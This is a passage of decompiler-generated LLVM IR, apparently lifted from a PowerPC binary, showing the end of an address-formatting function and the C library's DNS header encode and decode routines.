  store i32 %v0_1000a288, i32* @r3, align 4
  %v0_1000a28c = call i32 @__GI_strlen()
  %v0_1000a290 = load i32, i32* @r29, align 4
  %v2_1000a290 = add i32 %v0_1000a290, %v0_1000a28c
  store i32 %v2_1000a290, i32* %r29.global-to-local, align 4
  %v0_1000a2d0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000a2d0

dec_label_pc_1000a298:                            ; preds = %dec_label_pc_1000a234.thread, %dec_label_pc_1000a254, %dec_label_pc_1000a24c, %dec_label_pc_1000a23c, %dec_label_pc_1000a234
  %v0_1000a29867 = phi i32 [ 0, %dec_label_pc_1000a234.thread ], [ 6, %dec_label_pc_1000a254 ], [ 6, %dec_label_pc_1000a24c ], [ 6, %dec_label_pc_1000a23c ], [ %v0_1000a234.pre, %dec_label_pc_1000a234 ]
  %v0_1000a27466 = phi i32 [ %v2_1000a22c, %dec_label_pc_1000a234.thread ], [ %v1_1000a230, %dec_label_pc_1000a254 ], [ %v1_1000a230, %dec_label_pc_1000a24c ], [ %v1_1000a230, %dec_label_pc_1000a23c ], [ %v1_1000a230, %dec_label_pc_1000a234 ]
  %v1_1000a298 = mul i32 %v0_1000a29867, 4
  store i32 %v2_1000a0f0, i32* %r9.global-to-local, align 4
  %v2_1000a2a0 = add i32 %v1_1000a298, %v2_1000a0f0
  %v3_1000a2a0 = inttoptr i32 %v2_1000a2a0 to i32*
  %v4_1000a2a0 = load i32, i32* %v3_1000a2a0, align 4
  store i32 %v0_1000a27466, i32* @r3, align 4
  store i32 268477112, i32* @lr, align 4
  %v5_1000a2b4 = load i32, i32* @r7, align 4
  %v6_1000a2b4 = call i32 @sprintf(i32 %v0_1000a27466, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.479 to i32), i32 %v4_1000a2a0, i32 %v2_1000a0f0, i32 %v5_1000a2b4)
  %v0_1000a2b8 = load i32, i32* @r29, align 4
  %v2_1000a2b8 = add i32 %v0_1000a2b8, %v6_1000a2b4
  store i32 %v2_1000a2b8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a2bc

dec_label_pc_1000a2bc:                            ; preds = %dec_label_pc_1000a20c, %dec_label_pc_1000a210, %dec_label_pc_1000a298
  %v2_1000a21451 = phi i32 [ %v2_1000a22c, %dec_label_pc_1000a20c ], [ %v1_1000a218, %dec_label_pc_1000a210 ], [ %v2_1000a2b8, %dec_label_pc_1000a298 ]
  %v0_1000a2bc = load i32, i32* @r31, align 4
  %v1_1000a2bc = add i32 %v0_1000a2bc, 1
  store i32 %v1_1000a2bc, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000a2bc, 8
  %v0_1000a1f0 = load i32, i32* @r28, align 4
  %v1_1000a1f0 = icmp slt i32 %v0_1000a1f0, -1
  %v3_1000a1f0 = icmp eq i32 %v0_1000a1f0, -1
  store i1 %v1_1000a1f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000a1f0, label %dec_label_pc_1000a2c8

dec_label_pc_1000a2c8:                            ; preds = %dec_label_pc_1000a2bc
  br i1 %v3_1000a1f0, label %dec_label_pc_1000a2e8, label %dec_label_pc_1000a2d0

dec_label_pc_1000a2d0:                            ; preds = %dec_label_pc_1000a2c8, %dec_label_pc_1000a288
  %v2_1000a2e0 = phi i32 [ %v2_1000a21451, %dec_label_pc_1000a2c8 ], [ %v2_1000a290, %dec_label_pc_1000a288 ]
  %v0_1000a2d0 = phi i32 [ %v0_1000a1f0, %dec_label_pc_1000a2c8 ], [ %v0_1000a2d0.pre, %dec_label_pc_1000a288 ]
  %v1_1000a2d0 = load i32, i32* @r30, align 4
  %v2_1000a2d0 = add i32 %v1_1000a2d0, %v0_1000a2d0
  %v1_1000a2d4 = icmp slt i32 %v2_1000a2d0, 8
  %v3_1000a2d4 = icmp eq i32 %v2_1000a2d0, 8
  store i1 %v1_1000a2d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a2d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a2d4, label %dec_label_pc_1000a2dc, label %dec_label_pc_1000a2e8

dec_label_pc_1000a2dc:                            ; preds = %dec_label_pc_1000a2d0
  %v3_1000a2e0 = inttoptr i32 %v2_1000a2e0 to i8*
  store i8 58, i8* %v3_1000a2e0, align 1
  %v0_1000a2e4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a2e4 = add i32 %v0_1000a2e4, 1
  store i32 %v1_1000a2e4, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a2e8

dec_label_pc_1000a2e8:                            ; preds = %dec_label_pc_1000a2d0, %dec_label_pc_1000a2c8, %dec_label_pc_1000a2dc
  %v2_1000a2fc = phi i32 [ %v2_1000a2e0, %dec_label_pc_1000a2d0 ], [ %v2_1000a21451, %dec_label_pc_1000a2c8 ], [ %v1_1000a2e4, %dec_label_pc_1000a2dc ]
  %v1_1000a2e8 = sub i32 1, %v2_1000a1e4
  %v2_1000a2f0 = add i32 %v1_1000a2e8, %v2_1000a2fc
  %v1_1000a2f4 = load i32, i32* @r26, align 4
  %v2_1000a2f4 = icmp ult i32 %v2_1000a2f0, %v1_1000a2f4
  %v4_1000a2f4 = icmp eq i32 %v2_1000a2f0, %v1_1000a2f4
  store i1 %v2_1000a2f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a2f4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a2fc = inttoptr i32 %v2_1000a2fc to i8*
  store i8 0, i8* %v3_1000a2fc, align 1
  %v0_1000a300 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a300 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000a300 = or i1 %v0_1000a300, %v1_1000a300
  br i1 %v2_1000a300, label %dec_label_pc_1000a318, label %dec_label_pc_1000a304

dec_label_pc_1000a304:                            ; preds = %dec_label_pc_1000a2e8
  %v0_1000a304 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000a310 = inttoptr i32 %v0_1000a304 to i32*
  store i32 28, i32* %v2_1000a310, align 4
  %v0_1000a33c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a338

dec_label_pc_1000a318:                            ; preds = %dec_label_pc_1000a2e8
  %v0_1000a318 = load i32, i32* @r25, align 4
  %v2_1000a31c = bitcast i32* %stack_var_-88 to i8*
  %v3_1000a31c = call i32 @strcpy(i32 %v0_1000a318, i8* %v2_1000a31c)
  br label %dec_label_pc_1000a320

dec_label_pc_1000a320:                            ; preds = %dec_label_pc_1000a0dc, %dec_label_pc_1000a318
  %storemerge1 = phi i32 [ %v3_1000a0e8, %dec_label_pc_1000a0dc ], [ %v3_1000a31c, %dec_label_pc_1000a318 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a338

dec_label_pc_1000a328:                            ; preds = %dec_label_pc_1000a0d0
  %v0_1000a328 = call i32 @__errno_location()
  %v2_1000a330 = inttoptr i32 %v0_1000a328 to i32*
  store i32 97, i32* %v2_1000a330, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a338

dec_label_pc_1000a338:                            ; preds = %dec_label_pc_1000a268, %dec_label_pc_1000a320, %dec_label_pc_1000a304, %dec_label_pc_1000a328
  %v0_1000a33c = phi i32 [ 0, %dec_label_pc_1000a268 ], [ %storemerge1, %dec_label_pc_1000a320 ], [ %v0_1000a33c.pre, %dec_label_pc_1000a304 ], [ 0, %dec_label_pc_1000a328 ]
  ret i32 %v0_1000a33c

; uselistorder directives
  uselistorder i32 %v2_1000a2fc, { 1, 0 }
  uselistorder i32 %v2_1000a2d0, { 1, 0 }
  uselistorder i1 %v3_1000a1f0, { 0, 2, 1 }
  uselistorder i32 %v0_1000a1f0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000a2bc, { 2, 1, 0 }
  uselistorder i32 %v0_1000a27466, { 1, 0 }
  uselistorder i32 %v3_1000a278, { 1, 0 }
  uselistorder i32 %v0_1000a244, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000a234.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000a230, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000a200, { 1, 0 }
  uselistorder i32 %v0_1000a220, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000a200, { 0, 2, 1 }
  uselistorder i32 %v2_1000a22c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000a1f03, { 0, 2, 1 }
  uselistorder i32 %v0_1000a1d8, { 2, 1, 0 }
  uselistorder i32 %v0_1000a1c8.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000a1d0, { 1, 0, 2 }
  uselistorder i32 %v1_1000a1ac, { 2, 1, 0 }
  uselistorder i32 %v1_1000a1a8, { 1, 0 }
  uselistorder i32 %v0_1000a18c39, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000a19c42, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000a160, { 1, 0 }
  uselistorder i32 %v0_1000a1a8, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000a160, { 1, 0 }
  uselistorder i32 %v0_1000a18c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000a19c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000a13c, { 1, 0 }
  uselistorder i32 %v2_1000a134, { 1, 0 }
  uselistorder i32 %v0_1000a12c, { 1, 0, 2 }
  uselistorder i32 %v1_1000a114, { 1, 0 }
  uselistorder i32 %v2_1000a0f0, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 17, 12, 19, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 17, 12, 19, 14, 13, 15, 16 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder i32* @r7, { 10, 15, 16, 17, 0, 18, 19, 20, 21, 1, 22, 23, 6, 24, 25, 26, 27, 2, 28, 29, 30, 8, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 3, 41, 7, 4, 5, 42, 43, 9, 12, 13, 14, 11 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 5, 0, 6, 10, 11, 7, 8, 9, 12 }
  uselistorder i1 true, { 1, 2, 4, 3, 0 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5 }
  uselistorder i32 65535, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 13, 12, 7, 2, 6, 5, 4, 0, 1, 3, 11, 10, 9, 8 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000a338, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a320, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a2bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a298, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000a1f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a1c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1a8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a1a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a15c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a114, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r6.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000a434, label %dec_label_pc_1000a35c

dec_label_pc_1000a35c:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000a35c = add i32 %tmp, 2
  %v2_1000a35c = inttoptr i32 %v1_1000a35c to i8*
  %v3_1000a35c = load i8, i8* %v2_1000a35c, align 1
  store i32 12, i32* %r6.global-to-local, align 4
  store i8 %v3_1000a35c, i8* %tmp3, align 1
  %v2_1000a368 = load i32, i32* %arg1, align 4
  %v1_1000a36c = trunc i32 %v2_1000a368 to i8
  %v4_1000a36c = add i32 %arg2, 1
  %v5_1000a36c = inttoptr i32 %v4_1000a36c to i8*
  store i8 %v1_1000a36c, i8* %v5_1000a36c, align 1
  %v1_1000a370 = add i32 %tmp, 12
  %v2_1000a370 = inttoptr i32 %v1_1000a370 to i32*
  %v3_1000a370 = load i32, i32* %v2_1000a370, align 4
  %v1_1000a374 = add i32 %tmp, 16
  %v2_1000a374 = inttoptr i32 %v1_1000a374 to i32*
  %v3_1000a374 = load i32, i32* %v2_1000a374, align 4
  store i32 %v3_1000a374, i32* %r11.global-to-local, align 4
  %v1_1000a378 = add i32 %tmp, 4
  %v2_1000a378 = inttoptr i32 %v1_1000a378 to i32*
  %v3_1000a378 = load i32, i32* %v2_1000a378, align 4
  %v1_1000a37c = add i32 %tmp, 8
  %v2_1000a37c = inttoptr i32 %v1_1000a37c to i32*
  %v3_1000a37c = load i32, i32* %v2_1000a37c, align 4
  %v1_1000a380 = add i32 %tmp, 20
  %v2_1000a380 = inttoptr i32 %v1_1000a380 to i32*
  %v3_1000a380 = load i32, i32* %v2_1000a380, align 4
  store i32 %v3_1000a380, i32* %r7.global-to-local, align 4
  %v2_1000a384 = icmp ne i32 %v3_1000a370, 0
  %v5_1000a388 = zext i1 %v2_1000a384 to i32
  store i32 %v5_1000a388, i32* %r10.global-to-local, align 4
  %not.v2_1000a38c = icmp eq i32 %v3_1000a378, 0
  %v6_1000a390 = sext i1 %not.v2_1000a38c to i32
  %v2_1000a394 = icmp ne i32 %v3_1000a374, 0
  %v5_1000a398 = zext i1 %v2_1000a394 to i32
  store i32 %v5_1000a398, i32* %r11.global-to-local, align 4
  %v1_1000a3a0 = call i32 @__asm_rlwinm(i32 %v6_1000a390, i32 0, i32 24, i32 24)
  %v0_1000a3a4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a3a4 = mul i32 %v0_1000a3a4, 4
  store i32 %v1_1000a3a4, i32* %r10.global-to-local, align 4
  %v1_1000a3a8 = call i32 @__asm_rlwinm(i32 %v3_1000a37c, i32 3, i32 25, i32 28)
  %v1_1000a3ac = add i32 %v1_1000a3a0, 128
  %v0_1000a3b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000a3b0 = icmp ne i32 %v0_1000a3b0, 0
  %v5_1000a3b4 = zext i1 %v2_1000a3b0 to i32
  %v2_1000a3b8 = or i32 %v1_1000a3a4, %v1_1000a3a8
  store i32 %v2_1000a3b8, i32* %r10.global-to-local, align 4
  %v0_1000a3bc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a3bc = mul i32 %v0_1000a3bc, 2
  store i32 %v1_1000a3bc, i32* %r11.global-to-local, align 4
  %v2_1000a3c0 = or i32 %v2_1000a3b8, %v5_1000a3b4
  %v2_1000a3c4 = or i32 %v2_1000a3c0, %v1_1000a3ac
  %v2_1000a3c8 = or i32 %v2_1000a3c4, %v1_1000a3bc
  %v1_1000a3cc = trunc i32 %v2_1000a3c8 to i8
  %v4_1000a3cc = add i32 %arg2, 2
  %v5_1000a3cc = inttoptr i32 %v4_1000a3cc to i8*
  store i8 %v1_1000a3cc, i8* %v5_1000a3cc, align 1
  %v1_1000a3d0 = add i32 %tmp, 24
  %v2_1000a3d0 = inttoptr i32 %v1_1000a3d0 to i32*
  %v3_1000a3d0 = load i32, i32* %v2_1000a3d0, align 4
  %v1_1000a3d4 = add i32 %tmp, 28
  %v2_1000a3d4 = inttoptr i32 %v1_1000a3d4 to i32*
  %v3_1000a3d4 = load i32, i32* %v2_1000a3d4, align 4
  %not.v2_1000a3d8 = icmp eq i32 %v3_1000a3d0, 0
  %v6_1000a3dc = sext i1 %not.v2_1000a3d8 to i32
  %v1_1000a3e0 = call i32 @__asm_rlwinm(i32 %v6_1000a3dc, i32 0, i32 24, i32 24)
  %v1_1000a3e4 = urem i32 %v3_1000a3d4, 16
  %v1_1000a3e8 = add i32 %v1_1000a3e0, 128
  %v2_1000a3ec = or i32 %v1_1000a3e4, %v1_1000a3e8
  %v1_1000a3f0 = trunc i32 %v2_1000a3ec to i8
  %v4_1000a3f0 = add i32 %arg2, 3
  %v5_1000a3f0 = inttoptr i32 %v4_1000a3f0 to i8*
  store i8 %v1_1000a3f0, i8* %v5_1000a3f0, align 1
  %v1_1000a3f4 = add i32 %tmp, 34
  %v2_1000a3f4 = inttoptr i32 %v1_1000a3f4 to i8*
  %v3_1000a3f4 = load i8, i8* %v2_1000a3f4, align 1
  %v4_1000a3f8 = add i32 %arg2, 4
  %v5_1000a3f8 = inttoptr i32 %v4_1000a3f8 to i8*
  store i8 %v3_1000a3f4, i8* %v5_1000a3f8, align 1
  %v1_1000a3fc = add i32 %tmp, 32
  %v2_1000a3fc = inttoptr i32 %v1_1000a3fc to i32*
  %v3_1000a3fc = load i32, i32* %v2_1000a3fc, align 4
  %v1_1000a400 = trunc i32 %v3_1000a3fc to i8
  %v4_1000a400 = add i32 %arg2, 5
  %v5_1000a400 = inttoptr i32 %v4_1000a400 to i8*
  store i8 %v1_1000a400, i8* %v5_1000a400, align 1
  %v1_1000a404 = add i32 %tmp, 38
  %v2_1000a404 = inttoptr i32 %v1_1000a404 to i8*
  %v3_1000a404 = load i8, i8* %v2_1000a404, align 1
  %v4_1000a408 = add i32 %arg2, 6
  %v5_1000a408 = inttoptr i32 %v4_1000a408 to i8*
  store i8 %v3_1000a404, i8* %v5_1000a408, align 1
  %v1_1000a40c = add i32 %tmp, 36
  %v2_1000a40c = inttoptr i32 %v1_1000a40c to i32*
  %v3_1000a40c = load i32, i32* %v2_1000a40c, align 4
  %v1_1000a410 = trunc i32 %v3_1000a40c to i8
  %v4_1000a410 = add i32 %arg2, 7
  %v5_1000a410 = inttoptr i32 %v4_1000a410 to i8*
  store i8 %v1_1000a410, i8* %v5_1000a410, align 1
  %v1_1000a414 = add i32 %tmp, 42
  %v2_1000a414 = inttoptr i32 %v1_1000a414 to i8*
  %v3_1000a414 = load i8, i8* %v2_1000a414, align 1
  %v4_1000a418 = add i32 %arg2, 8
  %v5_1000a418 = inttoptr i32 %v4_1000a418 to i8*
  store i8 %v3_1000a414, i8* %v5_1000a418, align 1
  %v1_1000a41c = add i32 %tmp, 40
  %v2_1000a41c = inttoptr i32 %v1_1000a41c to i32*
  %v3_1000a41c = load i32, i32* %v2_1000a41c, align 4
  %v1_1000a420 = trunc i32 %v3_1000a41c to i8
  %v4_1000a420 = add i32 %arg2, 9
  %v5_1000a420 = inttoptr i32 %v4_1000a420 to i8*
  store i8 %v1_1000a420, i8* %v5_1000a420, align 1
  %v1_1000a424 = add i32 %tmp, 46
  %v2_1000a424 = inttoptr i32 %v1_1000a424 to i8*
  %v3_1000a424 = load i8, i8* %v2_1000a424, align 1
  %v4_1000a428 = add i32 %arg2, 10
  %v5_1000a428 = inttoptr i32 %v4_1000a428 to i8*
  store i8 %v3_1000a424, i8* %v5_1000a428, align 1
  %v1_1000a42c = add i32 %tmp, 44
  %v2_1000a42c = inttoptr i32 %v1_1000a42c to i32*
  %v3_1000a42c = load i32, i32* %v2_1000a42c, align 4
  %v1_1000a430 = trunc i32 %v3_1000a42c to i8
  %v4_1000a430 = add i32 %arg2, 11
  %v5_1000a430 = inttoptr i32 %v4_1000a430 to i8*
  store i8 %v1_1000a430, i8* %v5_1000a430, align 1
  %v0_1000a434.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a434

dec_label_pc_1000a434:                            ; preds = %entry, %dec_label_pc_1000a35c
  %v0_1000a434 = phi i32 [ -1, %entry ], [ %v0_1000a434.pre, %dec_label_pc_1000a35c ]
  ret i32 %v0_1000a434

; uselistorder directives
  uselistorder i32 %v1_1000a3bc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 13, 1, 6, 9, 8, 12, 11, 10, 3, 2, 5, 4, 7 }
  uselistorder label %dec_label_pc_1000a434, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000a43c = load i8, i8* %arg1, align 1
  %v4_1000a43c = zext i8 %v3_1000a43c to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000a444 = add i32 %tmp, 1
  %v3_1000a444 = inttoptr i32 %v2_1000a444 to i8*
  %v4_1000a444 = load i8, i8* %v3_1000a444, align 1
  %v5_1000a444 = zext i8 %v4_1000a444 to i32
  %v1_1000a44c = mul nuw nsw i32 %v4_1000a43c, 256
  %v2_1000a450 = or i32 %v5_1000a444, %v1_1000a44c
  %v2_1000a454 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000a450, i32* %v2_1000a454, align 4
  %v0_1000a458 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a458 = add i32 %v0_1000a458, 2
  %v2_1000a458 = inttoptr i32 %v1_1000a458 to i8*
  %v3_1000a458 = load i8, i8* %v2_1000a458, align 1
  %v4_1000a458 = zext i8 %v3_1000a458 to i32
  %v1_1000a45c = call i32 @__asm_rlwinm(i32 %v4_1000a458, i32 25, i32 31, i32 31)
  %v2_1000a460 = add i32 %arg2, 4
  %v3_1000a460 = inttoptr i32 %v2_1000a460 to i32*
  store i32 %v1_1000a45c, i32* %v3_1000a460, align 4
  %v0_1000a464 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a464 = add i32 %v0_1000a464, 2
  %v2_1000a464 = inttoptr i32 %v1_1000a464 to i8*
  %v3_1000a464 = load i8, i8* %v2_1000a464, align 1
  %v4_1000a464 = zext i8 %v3_1000a464 to i32
  %v1_1000a468 = call i32 @__asm_rlwinm(i32 %v4_1000a464, i32 29, i32 28, i32 31)
  %v2_1000a46c = add i32 %arg2, 8
  %v3_1000a46c = inttoptr i32 %v2_1000a46c to i32*
  store i32 %v1_1000a468, i32* %v3_1000a46c, align 4
  %v0_1000a470 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a470 = add i32 %v0_1000a470, 2
  %v2_1000a470 = inttoptr i32 %v1_1000a470 to i8*
  %v3_1000a470 = load i8, i8* %v2_1000a470, align 1
  %v4_1000a470 = zext i8 %v3_1000a470 to i32
  %v1_1000a474 = call i32 @__asm_rlwinm(i32 %v4_1000a470, i32 30, i32 31, i32 31)
  %v2_1000a478 = add i32 %arg2, 12
  %v3_1000a478 = inttoptr i32 %v2_1000a478 to i32*
  store i32 %v1_1000a474, i32* %v3_1000a478, align 4
  %v0_1000a47c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a47c = add i32 %v0_1000a47c, 2
  %v2_1000a47c = inttoptr i32 %v1_1000a47c to i8*
  %v3_1000a47c = load i8, i8* %v2_1000a47c, align 1
  %v4_1000a47c = zext i8 %v3_1000a47c to i32
  %v1_1000a480 = call i32 @__asm_rlwinm(i32 %v4_1000a47c, i32 31, i32 31, i32 31)
  %v2_1000a484 = add i32 %arg2, 16
  %v3_1000a484 = inttoptr i32 %v2_1000a484 to i32*
  store i32 %v1_1000a480, i32* %v3_1000a484, align 4
  %v0_1000a488 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a488 = add i32 %v0_1000a488, 2
  %v2_1000a488 = inttoptr i32 %v1_1000a488 to i8*
  %v3_1000a488 = load i8, i8* %v2_1000a488, align 1
  %tmp1 = urem i8 %v3_1000a488, 2
  %v1_1000a48c = zext i8 %tmp1 to i32
  %v2_1000a490 = add i32 %arg2, 20
  %v3_1000a490 = inttoptr i32 %v2_1000a490 to i32*
  store i32 %v1_1000a48c, i32* %v3_1000a490, align 4
  %v0_1000a494 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a494 = add i32 %v0_1000a494, 3
  %v2_1000a494 = inttoptr i32 %v1_1000a494 to i8*
  %v3_1000a494 = load i8, i8* %v2_1000a494, align 1
  %v4_1000a494 = zext i8 %v3_1000a494 to i32
  %v1_1000a498 = call i32 @__asm_rlwinm(i32 %v4_1000a494, i32 25, i32 31, i32 31)
  %v2_1000a49c = add i32 %arg2, 24
  %v3_1000a49c = inttoptr i32 %v2_1000a49c to i32*
  store i32 %v1_1000a498, i32* %v3_1000a49c, align 4
  %v0_1000a4a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4a0 = add i32 %v0_1000a4a0, 3
  %v2_1000a4a0 = inttoptr i32 %v1_1000a4a0 to i8*
  %v3_1000a4a0 = load i8, i8* %v2_1000a4a0, align 1
  %tmp2 = urem i8 %v3_1000a4a0, 16
  %v1_1000a4a4 = zext i8 %tmp2 to i32
  %v2_1000a4a8 = add i32 %arg2, 28
  %v3_1000a4a8 = inttoptr i32 %v2_1000a4a8 to i32*
  store i32 %v1_1000a4a4, i32* %v3_1000a4a8, align 4
  %v0_1000a4ac = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4ac = add i32 %v0_1000a4ac, 4
  %v2_1000a4ac = inttoptr i32 %v1_1000a4ac to i8*
  %v3_1000a4ac = load i8, i8* %v2_1000a4ac, align 1
  %v4_1000a4ac = zext i8 %v3_1000a4ac to i32
  %v1_1000a4b0 = add i32 %v0_1000a4ac, 5
  %v2_1000a4b0 = inttoptr i32 %v1_1000a4b0 to i8*
  %v3_1000a4b0 = load i8, i8* %v2_1000a4b0, align 1
  %v4_1000a4b0 = zext i8 %v3_1000a4b0 to i32
  %v1_1000a4b4 = mul nuw nsw i32 %v4_1000a4ac, 256
  %v2_1000a4b8 = or i32 %v4_1000a4b0, %v1_1000a4b4
  %v2_1000a4bc = add i32 %arg2, 32
  %v3_1000a4bc = inttoptr i32 %v2_1000a4bc to i32*
  store i32 %v2_1000a4b8, i32* %v3_1000a4bc, align 4
  %v0_1000a4c0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4c0 = add i32 %v0_1000a4c0, 6
  %v2_1000a4c0 = inttoptr i32 %v1_1000a4c0 to i8*
  %v3_1000a4c0 = load i8, i8* %v2_1000a4c0, align 1
  %v4_1000a4c0 = zext i8 %v3_1000a4c0 to i32
  %v1_1000a4c4 = add i32 %v0_1000a4c0, 7
  %v2_1000a4c4 = inttoptr i32 %v1_1000a4c4 to i8*
  %v3_1000a4c4 = load i8, i8* %v2_1000a4c4, align 1
  %v4_1000a4c4 = zext i8 %v3_1000a4c4 to i32
  %v1_1000a4c8 = mul nuw nsw i32 %v4_1000a4c0, 256
  %v2_1000a4cc = or i32 %v4_1000a4c4, %v1_1000a4c8
  %v2_1000a4d0 = add i32 %arg2, 36
  %v3_1000a4d0 = inttoptr i32 %v2_1000a4d0 to i32*
  store i32 %v2_1000a4cc, i32* %v3_1000a4d0, align 4
  %v0_1000a4d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4d4 = add i32 %v0_1000a4d4, 8
  %v2_1000a4d4 = inttoptr i32 %v1_1000a4d4 to i8*
  %v3_1000a4d4 = load i8, i8* %v2_1000a4d4, align 1
  %v4_1000a4d4 = zext i8 %v3_1000a4d4 to i32
  %v1_1000a4d8 = add i32 %v0_1000a4d4, 9
  %v2_1000a4d8 = inttoptr i32 %v1_1000a4d8 to i8*
  %v3_1000a4d8 = load i8, i8* %v2_1000a4d8, align 1
  %v4_1000a4d8 = zext i8 %v3_1000a4d8 to i32
  %v1_1000a4dc = mul nuw nsw i32 %v4_1000a4d4, 256
  %v2_1000a4e0 = or i32 %v4_1000a4d8, %v1_1000a4dc
  %v2_1000a4e4 = add i32 %arg2, 40
  %v3_1000a4e4 = inttoptr i32 %v2_1000a4e4 to i32*
  store i32 %v2_1000a4e0, i32* %v3_1000a4e4, align 4
  %v0_1000a4e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4e8 = add i32 %v0_1000a4e8, 10
  %v2_1000a4e8 = inttoptr i32 %v1_1000a4e8 to i8*
  %v3_1000a4e8 = load i8, i8* %v2_1000a4e8, align 1
  %v4_1000a4e8 = zext i8 %v3_1000a4e8 to i32
  %v1_1000a4ec = add i32 %v0_1000a4e8, 11
  %v2_1000a4ec = inttoptr i32 %v1_1000a4ec to i8*
  %v3_1000a4ec = load i8, i8* %v2_1000a4ec, align 1
  %v4_1000a4ec = zext i8 %v3_1000a4ec to i32
  store i32 %v4_1000a4ec, i32* %r9.global-to-local, align 4
  %v1_1000a4f0 = mul nuw nsw i32 %v4_1000a4e8, 256
  %v2_1000a4f4 = or i32 %v4_1000a4ec, %v1_1000a4f0
  %v2_1000a4f8 = add i32 %arg2, 44
  %v3_1000a4f8 = inttoptr i32 %v2_1000a4f8 to i32*
  store i32 %v2_1000a4f4, i32* %v3_1000a4f8, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 2, 3, 7, 8, 9, 1, 5, 6, 0, 4 }
